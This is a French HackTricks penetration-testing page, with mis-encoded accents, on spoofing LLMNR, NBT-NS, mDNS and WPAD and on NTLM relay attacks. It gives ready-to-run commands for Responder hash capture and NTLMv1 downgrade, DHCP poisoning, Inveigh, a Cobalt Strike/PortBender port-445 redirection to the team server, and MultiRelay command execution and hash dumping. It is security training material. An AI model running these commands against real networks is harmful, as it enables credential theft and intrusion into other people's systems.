# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS : <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Protocoles r√©seau

### Protocoles de r√©solution d'h√¥te local
- **LLMNR, NBT-NS et mDNS** :
- Microsoft et d'autres syst√®mes d'exploitation utilisent LLMNR et NBT-NS pour la r√©solution de noms locaux en cas d'√©chec du DNS. De m√™me, les syst√®mes Apple et Linux utilisent mDNS.
- Ces protocoles sont vuln√©rables √† l'interception et au spoofing en raison de leur nature de diffusion non authentifi√©e sur UDP.
- [Responder](https://github.com/lgandx/Responder) peut √™tre utilis√© pour se faire passer pour des services en envoyant des r√©ponses forg√©es aux h√¥tes interrogeant ces protocoles.
- Vous trouverez plus d'informations sur l'usurpation de service √† l'aide de Responder [ici](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protocole de d√©couverte automatique de proxy Web (WPAD)
- WPAD permet aux navigateurs de d√©couvrir automatiquement les param√®tres de proxy.
- La d√©couverte est facilit√©e via DHCP, DNS, ou en cas d'√©chec du DNS, en utilisant LLMNR et NBT-NS en dernier recours.
- Responder peut automatiser les attaques WPAD, redirigeant les clients vers des serveurs WPAD malveillants.

### Responder pour l'empoisonnement de protocole
- **Responder** est un outil utilis√© pour empoisonner les requ√™tes LLMNR, NBT-NS et mDNS, r√©pondant de mani√®re s√©lective en fonction des types de requ√™tes, ciblant principalement les services SMB.
- Il est pr√©install√© dans Kali Linux, configurable √† `/etc/responder/Responder.conf`.
- Responder affiche les hachages captur√©s √† l'√©cran et les enregistre dans le r√©pertoire `/usr/share/responder/logs`.
- Il prend en charge √† la fois IPv4 et IPv6.
- La version Windows de Responder est disponible [ici](https://github.com/lgandx/Responder-Windows).

#### Ex√©cution de Responder
- Pour ex√©cuter Responder avec les param√®tres par d√©faut : `responder -I <Interface>`
- Pour une sonde plus agressive (avec des effets secondaires potentiels) : `responder -I <Interface> -P -r -v`
- Techniques pour capturer les d√©fis/r√©ponses NTLMv1 pour un craquage plus facile : `responder -I <Interface> --lm --disable-ess`
- L'usurpation de WPAD peut √™tre activ√©e avec : `responder -I <Interface> --wpad`
- Les demandes NetBIOS peuvent √™tre r√©solues vers l'IP de l'attaquant, et un proxy d'authentification peut √™tre configur√© : `responder.py -I <interface> -Pv`

### Empoisonnement DHCP avec Responder
- L'usurpation des r√©ponses DHCP peut empoisonner de mani√®re permanente les informations de routage d'une victime, offrant une alternative plus furtive √† l'empoisonnement ARP.
- Cela n√©cessite une connaissance pr√©cise de la configuration du r√©seau cible.
- Ex√©cution de l'attaque : `./Responder.py -I eth0 -Pdv`
- Cette m√©thode peut capturer efficacement les hachages NTLMv1/2, mais elle n√©cessite une manipulation soigneuse pour √©viter les perturbations du r√©seau.

### Capture de cr√©dentiels avec Responder
- Responder se fera passer pour des services en utilisant les protocoles mentionn√©s ci-dessus, capturant des identifiants (g√©n√©ralement un d√©fi/r√©ponse NTLMv2) lorsqu'un utilisateur tente de s'authentifier contre les services usurp√©s.
- Des tentatives peuvent √™tre faites pour r√©trograder vers NetNTLMv1 ou d√©sactiver ESS pour faciliter le craquage des identifiants.

Il est crucial de noter que l'utilisation de ces techniques doit √™tre l√©gale et √©thique, en garantissant une autorisation appropri√©e et en √©vitant toute perturbation ou acc√®s non autoris√©.

## Inveigh

Inveigh est un outil pour les testeurs de p√©n√©tration et les √©quipes rouges, con√ßu pour les syst√®mes Windows. Il offre des fonctionnalit√©s similaires √† Responder, effectuant des attaques de spoofing et de l'homme du milieu. L'outil est pass√© d'un script PowerShell √† un binaire C#, avec [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) et [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) comme versions principales. Les param√®tres d√©taill√©s et les instructions peuvent √™tre trouv√©s dans le [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh peut √™tre utilis√© via PowerShell :
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou ex√©cut√© en tant que binaire C# :
```bash
Inveigh.exe
```
### Attaque de relais NTLM

Cette attaque exploite les sessions d'authentification SMB pour acc√©der √† une machine cible, accordant un shell syst√®me en cas de succ√®s. Les principaux pr√©requis incluent :
- L'utilisateur d'authentification doit avoir un acc√®s administrateur local sur l'h√¥te relais.
- La signature SMB doit √™tre d√©sactiv√©e.

#### Transfert de port 445 et tunnelisation

Dans les sc√©narios o√π une introduction directe au r√©seau n'est pas r√©alisable, le trafic sur le port 445 doit √™tre transf√©r√© et tunnelis√©. Des outils comme [**PortBender**](https://github.com/praetorian-inc/PortBender) aident √† rediriger le trafic du port 445 vers un autre port, ce qui est essentiel lorsque l'acc√®s administrateur local est disponible pour le chargement du pilote.

Configuration et utilisation de PortBender dans Cobalt Strike :
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Autres outils pour l'attaque de relais NTLM

- **Metasploit** : Configur√© avec des proxies, des d√©tails d'h√¥tes locaux et distants.
- **smbrelayx** : Un script Python pour relayer des sessions SMB et ex√©cuter des commandes ou d√©ployer des portes d√©rob√©es.
- **MultiRelay** : Un outil de la suite Responder pour relayer des utilisateurs sp√©cifiques ou tous les utilisateurs, ex√©cuter des commandes ou extraire des hachages.

Chaque outil peut √™tre configur√© pour fonctionner via un proxy SOCKS si n√©cessaire, permettant des attaques m√™me avec un acc√®s r√©seau indirect.

### Fonctionnement de MultiRelay

MultiRelay est ex√©cut√© depuis le r√©pertoire _**/usr/share/responder/tools**_, ciblant des IPs ou des utilisateurs sp√©cifiques.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### Forcer les connexions NTLM

Sous Windows, vous **pouvez √™tre en mesure de forcer certains comptes privil√©gi√©s √† s'authentifier sur des machines arbitraires**. Consultez la page suivante pour en savoir plus :

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## R√©f√©rences
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
